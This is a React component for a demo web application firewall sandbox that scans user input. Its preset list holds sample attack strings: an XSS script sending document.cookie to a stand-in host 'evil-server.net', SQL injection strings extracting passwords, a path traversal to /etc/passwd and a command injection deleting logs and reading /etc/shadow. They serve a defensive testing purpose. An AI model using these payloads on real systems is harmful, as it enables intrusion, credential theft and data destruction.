import React, { useState } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  ShieldAlert, 
  ShieldCheck, 
  Terminal, 
  Cpu, 
  Zap, 
  HelpCircle, 
  Lock, 
  AlertTriangle, 
  Check, 
  Sparkles, 
  RefreshCw,
  Search,
  BookOpen,
  Eye,
  FileCode,
  AlertOctagon,
  Fingerprint,
  Code,
  History as HistoryIcon
} from 'lucide-react';
import { scanInput, SecurityStatus } from '../lib/securityShield';

const PAYLOAD_PRESETS = [
  {
    category: 'Cross-Site Scripting (XSS)',
    title: 'Cookie Theft Script Tag',
    payload: `<script>fetch('https://evil-server.net/logger?cookie=' + document.cookie)</script>`
  },
  {
    category: 'Cross-Site Scripting (XSS)',
    title: 'Inline Event Handler (onerror)',
    payload: `<img src="malicious.gif" onerror="alert('System Compromised')" />`
  },
  {
    category: 'Cross-Site Scripting (XSS)',
    title: 'JavaScript Protocol Attack',
    payload: `javascript:alert('Execute inline action payload')`
  },
  {
    category: 'SQL Injection (SQLi)',
    title: 'Tautology Authentication Bypass',
    payload: `admin' OR 1=1; --`
  },
  {
    category: 'SQL Injection (SQLi)',
    title: 'Consolidated Union Data Extraction',
    payload: `' UNION SELECT username, password FROM sovereign_operators; --`
  },
  {
    category: 'Path Traversal',
    title: 'Sensitive OS Log File Read',
    payload: `../../../../etc/passwd`
  },
  {
    category: 'Command Injection',
    title: 'Arbitrary Shell Execution Pipe',
    payload: `; rm -rf /var/log/nginx && cat /etc/shadow`
  }
];

export const SovereignWAFSandbox = ({ onNotify }: { onNotify: (msg: string) => void }) => {
  const [inputText, setInputText] = useState('');
  const [scanResult, setScanResult] = useState<SecurityStatus | null>(null);
  const [activeTab, setActiveTab] = useState<'sandbox' | 'syslogs' | 'architecture'>('sandbox');
  const [scannedCount, setScannedCount] = useState(0);
  const [blockedCount, setBlockedCount] = useState(0);
  const [threatHistory, setThreatHistory] = useState<Array<SecurityStatus & { timestamp: string }>>([
    {
      detected: true,
      type: 'XSS',
      pattern: 'Inline JavaScript Event Handler',
      payload: "onerror=alert(1)",
      clean: "[SECURE_SANITISED]",
      timestamp: "10m ago"
    },
    {
      detected: true,
      type: 'SQL_INJECTION',
      pattern: 'SQL Tautology / Query Manipulation',
      payload: "' OR '1'='1",
      clean: "[SECURE_SANITISED]",
      timestamp: "23m ago"
    }
  ]);

  const handleRunScan = (text: string) => {
    const trimmed = text.trim();
    if (!trimmed) {
      onNotify('⚠️ Veuillez entrer un payload ou une commande à analyser.');
      return;
    }

    const result = scanInput(trimmed);
    setScanResult(result);
    setScannedCount(prev => prev + 1);

    if (result.detected) {
      setBlockedCount(prev => prev + 1);
      
      // Add threat to simulation log history
      const now = new Date();
      const timeStr = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
      setThreatHistory(prev => [
        { ...result, timestamp: timeStr },
        ...prev
      ]);

      onNotify(`🚨 Bloqué par Sovereign WAF : ${result.pattern}`);
    } else {
      onNotify('✅ Signature saine. Aucun code malveillant détecté.');
    }
  };

  const handleApplyPreset = (payload: string) => {
    setInputText(payload);
    handleRunScan(payload);
  };

  const handleClear = () => {
    setInputText('');
    setScanResult(null);
  };

  return (
    <div className="space-y-8 animate-fade-in text-[#cbd5e1] font-sans">
      
      {/* Intro visual banner */}
      <div className="bg-[#140b2f]/85 border border-[#372375]/50 rounded-[2.5rem] p-8 shadow-2xl relative overflow-hidden">
        <div className="absolute top-0 right-0 w-96 h-96 bg-emerald-500/5 rounded-full blur-[100px] pointer-events-none" />
        <div className="relative z-10 flex flex-col md:flex-row justify-between items-start md:items-center gap-6">
          <div className="space-y-2 max-w-2xl text-left">
            <span className="text-[10px] bg-emerald-500/10 text-emerald-400 font-extrabold border border-emerald-500/30 px-3 py-1 rounded-full uppercase tracking-wider">
              NEXUS FIRE FLUX ENFORCEMENT
            </span>
            <h3 className="text-2xl font-black italic uppercase tracking-tighter text-white">SOVEREIGN WEB APPLICATION FIREWALL (WAF)</h3>
            <p className="text-xs text-slate-400 font-medium leading-relaxed">
              Provides dual-layer cryptographic defensive sanitization. Intelligently scans all incoming user profile modifications, lookup queries, and chat strings. Intercepts and deconstructs complex injection matrices before client rendering or backend pipeline routing.
            </p>
          </div>
          
          <div className="flex gap-4 shrink-0 bg-[#0c051f]/80 p-4 border border-[#372375]/40 rounded-2xl font-mono text-center min-w-[200px]">
            <div className="flex-1">
              <div className="text-xl font-black text-emerald-400">{scannedCount}</div>
              <div className="text-[9px] text-slate-500 font-bold uppercase">Scanned Inputs</div>
            </div>
            <div className="border-r border-slate-800" />
            <div className="flex-1">
              <div className="text-xl font-black text-rose-500">{blockedCount}</div>
              <div className="text-[9px] text-slate-500 font-bold uppercase font-black">Malicious Blocked</div>
            </div>
          </div>
        </div>
      </div>

      {/* Selector Tabs */}
      <div className="flex gap-4 border-b border-slate-800/80 pb-px">
        <button
          onClick={() => setActiveTab('sandbox')}
          className={`pb-3 text-xs uppercase tracking-wider border-b-2 transition-all cursor-pointer flex items-center gap-2 ${
            activeTab === 'sandbox' ? 'border-orange-500 font-black text-white' : 'border-transparent text-slate-400 hover:text-slate-200'
          }`}
        >
          <Terminal className="w-3.5 h-3.5" />
          Attack Sandbox Simulator
        </button>
        <button
          onClick={() => setActiveTab('syslogs')}
          className={`pb-3 text-xs uppercase tracking-wider border-b-2 transition-all cursor-pointer flex items-center gap-2 ${
            activeTab === 'syslogs' ? 'border-orange-500 font-black text-white' : 'border-transparent text-slate-400 hover:text-slate-200'
          }`}
        >
          <HistoryIcon className="w-3.5 h-3.5" />
          Shield Block Ledger ({threatHistory.length})
        </button>
        <button
          onClick={() => setActiveTab('architecture')}
          className={`pb-3 text-xs uppercase tracking-wider border-b-2 transition-all cursor-pointer flex items-center gap-2 ${
            activeTab === 'architecture' ? 'border-orange-500 font-black text-white' : 'border-transparent text-slate-400 hover:text-slate-200'
          }`}
        >
          <HelpCircle className="w-3.5 h-3.5" />
          Why You Are Safe (React Specs)
        </button>
      </div>

      {activeTab === 'sandbox' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 text-left">
          
          {/* Preset Attack Payloads - Left 5 cols */}
          <div className="lg:col-span-5 space-y-4">
            <div className="bg-[#12072b]/60 border border-[#382079]/45 rounded-3xl p-6 shadow-xl space-y-4">
              <div>
                <h4 className="text-xs font-extrabold text-white uppercase tracking-wider">PRESET EXPLOIT SIMULATORS</h4>
                <p className="text-[10px] text-slate-500 mt-0.5 font-medium">Select a malicious exploit pattern to check WAF shield detection rules.</p>
              </div>

              <div className="space-y-2.5 max-h-[380px] overflow-y-auto pr-1">
                {PAYLOAD_PRESETS.map((p, i) => (
                  <button
                    key={i}
                    onClick={() => handleApplyPreset(p.payload)}
                    className="w-full text-left p-3 bg-[#180a3a]/40 hover:bg-[#200e4c]/70 border border-[#3e238f]/40 hover:border-orange-500/40 rounded-xl transition-all group flex flex-col gap-1 cursor-pointer"
                  >
                    <div className="flex justify-between items-center w-full">
                      <span className="text-[9px] text-[#0ea5e9] font-black uppercase font-mono">{p.category}</span>
                      <span className="text-[8px] opacity-0 group-hover:opacity-100 transition-opacity text-orange-400 font-black tracking-widest font-mono uppercase">RUN PAYLOAD &gt;</span>
                    </div>
                    <span className="text-xs font-extrabold text-white group-hover:text-orange-400 transition-colors">{p.title}</span>
                    <code className="text-[9.5px] truncate block opacity-60 text-slate-350 bg-[#080216]/50 p-1.5 rounded-lg border border-slate-900 font-mono mt-1 w-full">
                      {p.payload}
                    </code>
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* Core Interactive Sandbox - Right 7 cols */}
          <div className="lg:col-span-7 space-y-6">
            <div className="bg-[#12072b]/60 border border-[#382079]/45 rounded-3xl p-6 shadow-xl space-y-5">
              <div className="flex justify-between items-center">
                <div>
                  <h4 className="text-xs font-extrabold text-white uppercase tracking-wider">WAF COMMAND CONSOLE</h4>
                  <p className="text-[10px] text-slate-500 mt-0.5 font-semibold">Test custom raw strings, javascript blocks, or SQL codes inspectively.</p>
                </div>
                <button
                  type="button"
                  onClick={handleClear}
                  className="px-3 py-1 bg-slate-800/50 border border-slate-700/50 hover:bg-slate-700 text-slate-300 text-[10px] font-black rounded-lg uppercase tracking-wider transition-all"
                >
                  Reset Form
                </button>
              </div>

              {/* Input Area */}
              <div id="interactive-waf-playground" className="space-y-3">
                <textarea
                  value={inputText}
                  onChange={(e) => setInputText(e.target.value)}
                  placeholder="Paste or type potential scripts / HTML tags here... e.g. <script>alert(1)</script>"
                  className="w-full h-28 bg-[#090217]/95 border border-[#3e238f]/60 focus:border-orange-550/60 rounded-2xl p-4 text-xs font-mono text-slate-200 outline-none resize-none placeholder-slate-650 transition-all focus:ring-1 focus:ring-orange-500/20"
                />

                <button
                  onClick={() => handleRunScan(inputText)}
                  className="w-full py-4.5 bg-gradient-to-r from-orange-600 to-orange-500 hover:from-orange-550 hover:to-orange-450 text-white font-black text-xs uppercase tracking-widest rounded-2xl transition-all shadow-lg flex items-center justify-center gap-2 cursor-pointer"
                >
                  <Cpu className="w-4 h-4 animate-spin-slow text-white" />
                  EXECUTE SOVEREIGN INTERCEPTION ANALYSIS
                </button>
              </div>

              {/* Live Scan Result Overlay */}
              <AnimatePresence mode="wait">
                {scanResult && (
                  <motion.div
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0, y: -10 }}
                    className={`rounded-2xl p-5 border text-left space-y-4 ${
                      scanResult.detected
                        ? 'bg-red-500/10 border-red-501/30 border-red-500/40 text-red-100 shadow-[0_0_20px_rgba(239,68,68,0.08)]'
                        : 'bg-emerald-500/5 border-emerald-500/30 text-emerald-100 shadow-[0_0_20px_rgba(16,185,129,0.06)]'
                    }`}
                  >
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-3">
                        <div className={`p-2.5 rounded-xl border ${
                          scanResult.detected 
                            ? 'bg-red-500/20 border-red-500/40 text-red-400' 
                            : 'bg-emerald-500/20 border-emerald-500/40 text-emerald-400'
                        }`}>
                          {scanResult.detected ? <AlertOctagon className="w-5 h-5 animate-bounce" /> : <ShieldCheck className="w-5 h-5" />}
                        </div>
                        <div>
                          <div className="text-[10px] text-slate-400 font-extrabold uppercase font-mono">WAF CORE SHIELD DECISION</div>
                          <span className="text-sm font-black uppercase tracking-tight">
                            {scanResult.detected ? 'INTRUSION VULNERABILITY ENGAGED' : 'SANITISED INTEGRITY OPTIMAL'}
                          </span>
                        </div>
                      </div>

                      <span className={`px-3 py-1 rounded-full text-[9px] font-black uppercase tracking-widest ${
                        scanResult.detected ? 'bg-red-650 bg-red-650/40 border border-red-500/50 text-red-200' : 'bg-emerald-650/30 border border-emerald-500/50 text-emerald-350'
                      }`}>
                        {scanResult.detected ? 'MITIGATED (BLOCKED)' : 'PASSED (CLEAN)'}
                      </span>
                    </div>

                    <div className="border-t border-slate-800/60 pt-4 grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div className="space-y-1">
                        <span className="text-[9px] font-bold uppercase text-slate-500">Threat Fingerprint Category</span>
                        <div className="text-xs font-black text-white font-mono uppercase">{scanResult.type || 'None (Safe Zone)'}</div>
                      </div>
                      
                      <div className="space-y-1">
                        <span className="text-[9px] font-bold uppercase text-slate-500">Identified Attack Signature</span>
                        <div className="text-xs font-black text-orange-400 uppercase font-mono">{scanResult.pattern || 'None Detected'}</div>
                      </div>
                    </div>

                    {scanResult.detected && (
                      <div className="space-y-2 bg-[#0a031a] p-3 rounded-xl border border-slate-850 border-slate-900">
                        <span className="text-[8.5px] font-bold text-red-450 uppercase tracking-widest block font-mono">MITIGATED RAW EXPLOIT BLOCK</span>
                        <code className="text-[10.5px] font-medium text-rose-350 font-mono block break-all leading-tight">
                          {scanResult.payload}
                        </code>
                      </div>
                    )}

                    <div className="space-y-2 bg-[#061014] p-3.5 rounded-xl border border-emerald-950 border-emerald-900/40">
                      <span className="text-[8.5px] font-bold text-emerald-400 uppercase tracking-widest block font-mono">CLEANED STRUCT REFERENCE OUTPUT</span>
                      <code className="text-[10.5px] font-medium text-emerald-300 font-mono block break-all leading-tight">
                        {scanResult.clean}
                      </code>
                    </div>

                    <div className="text-[9.5px] text-slate-400 font-medium leading-relaxed bg-[#1b103c]/20 p-3 rounded-lg border border-[#3e238f]/10">
                      <strong>Operator Threat Report:</strong> {scanResult.detected 
                        ? "Sovereign Shield detected an intentional injection exploit. The malicious script tag or logic structure has been stripped automatically. The input safe variable substitution has been rewritten to prevent XSS rendering."
                        : "Input variable safely allowed. No command injections, SQL constructs, or inline HTML event scripts matched the active cyber security firewall rules."}
                    </div>

                  </motion.div>
                )}
              </AnimatePresence>
            </div>
          </div>

        </div>
      )}

      {activeTab === 'syslogs' && (
        <div className="bg-[#12072b]/65 border border-[#382079]/45 rounded-3xl p-6 shadow-xl text-left space-y-4">
          <div className="flex justify-between items-center border-b border-slate-800/80 pb-3">
            <div>
              <h4 className="text-sm font-extrabold text-white uppercase tracking-wider">SHIELD SHIELD BLOCK SYSLOG</h4>
              <p className="text-[10px] text-slate-500 mt-0.5 font-medium">Real-time log tracking blocked injection attacks since system initialization.</p>
            </div>
            <button
              onClick={() => {
                setThreatHistory([]);
                onNotify('🧹 Historique du journal de sécurité WAF effacé.');
              }}
              className="text-[9px] px-3 py-1.5 bg-slate-800/50 border border-slate-705/30 hover:bg-slate-700 hover:text-white text-slate-400 font-black uppercase rounded-lg transition-all"
            >
              Clear Log System
            </button>
          </div>

          {threatHistory.length === 0 ? (
            <div className="py-12 text-center space-y-2">
              <ShieldCheck className="w-12 h-12 text-emerald-400 mx-auto opacity-50" />
              <p className="text-slate-400 text-xs font-extrabold uppercase font-mono">No active intrusions logged</p>
              <p className="text-[10px] text-slate-500">All user actions comply with default parameters.</p>
            </div>
          ) : (
            <div className="space-y-3.5 max-h-[400px] overflow-y-auto pr-1">
              {threatHistory.map((threat, i) => (
                <div key={i} className="p-4 bg-[#0d0421] border border-red-500/30 rounded-2xl flex flex-col md:flex-row justify-between items-start md:items-center gap-4 hover:border-red-500/50 transition-colors">
                  <div className="space-y-1.5 text-left">
                    <div className="flex items-center gap-2">
                      <span className="px-2 py-0.5 bg-red-600/20 border border-red-500/30 text-red-200 rounded-full text-[8px] font-black uppercase font-mono">
                        {threat.type}
                      </span>
                      <span className="text-xs font-bold text-white font-mono">{threat.pattern}</span>
                      <span className="text-[9px] text-slate-505 text-slate-500 font-mono">@{threat.timestamp}</span>
                    </div>
                    
                    <div className="text-[10px] text-slate-400 font-medium">
                      Intercepted payload: <code className="text-rose-400 bg-red-950/20 px-1 py-0.5 rounded font-mono break-all">{threat.payload}</code>
                    </div>
                  </div>

                  <span className="shrink-0 text-[9px] font-black text-emerald-400 bg-emerald-500/5 border border-emerald-500/30 px-2.5 py-1 rounded-full uppercase tracking-widest font-mono">
                    STATUS: SECURED
                  </span>
                </div>
              ))}
            </div>
          )}
        </div>
      )}

      {activeTab === 'architecture' && (
        <div className="bg-[#12072b]/65 border border-[#382079]/45 rounded-3xl p-6 shadow-xl text-left space-y-6">
          <div className="border-b border-slate-800/80 pb-3">
            <h4 className="text-sm font-extrabold text-white uppercase tracking-wider">REACT SYSTEM ESCAPE SPECIFICATIONS</h4>
            <p className="text-[10px] text-slate-500 mt-0.5 font-semibold">Technical briefing explaining how user-entered inputs remain completely safe in React pipelines.</p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <div className="p-5 bg-[#170a3c]/30 border border-[#3e238f]/30 rounded-2xl space-y-3">
              <div className="w-10 h-10 rounded-xl bg-orange-600/10 border border-orange-500/30 text-orange-450 flex items-center justify-center">
                <Code className="w-5 h-5 text-orange-400" />
              </div>
              <h5 className="text-xs font-black text-white uppercase">JSX Auto-Escape</h5>
              <p className="text-[10.5px] text-slate-400 font-medium leading-relaxed">
                By default, React escapes all string state structures before writing them to the Document Object Model (DOM). String values like <code>{"{userInput}"}</code> are evaluated strictly as text node values rather than compiled, preventing script code execution.
              </p>
            </div>

            <div className="p-5 bg-[#170a3c]/30 border border-[#3e238f]/30 rounded-2xl space-y-3">
              <div className="w-10 h-10 rounded-xl bg-orange-600/10 border border-orange-500/30 text-orange-450 flex items-center justify-center">
                <Lock className="w-5 h-5 text-orange-450" />
              </div>
              <h5 className="text-xs font-black text-white uppercase">Raw Outer HTML Bans</h5>
              <p className="text-[10.5px] text-slate-400 font-medium leading-relaxed">
                Our Sovereign codebase is audited and completely free of <code>dangerouslySetInnerHTML</code> parameters. All text layouts use standard safe string values, eliminating DOM-based cross-site injection loopholes.
              </p>
            </div>

            <div className="p-5 bg-[#170a3c]/30 border border-[#3e238f]/30 rounded-2xl space-y-3">
              <div className="w-10 h-10 rounded-xl bg-orange-600/10 border border-orange-500/30 text-orange-455-5 flex items-center justify-center">
                <Fingerprint className="w-5 h-5 text-orange-400" />
              </div>
              <h5 className="text-xs font-black text-white uppercase">Defensive Prevalidation</h5>
              <p className="text-[10.5px] text-slate-400 font-medium leading-relaxed">
                To guarantee flawless validation, the supplementary <strong>Sovereign WAF</strong> pre-emptively audits user text boundaries (profile names, support inputs, tickers). Unsafe scripts are neutralized immediately upon validation.
              </p>
            </div>
          </div>
        </div>
      )}

    </div>
  );
};
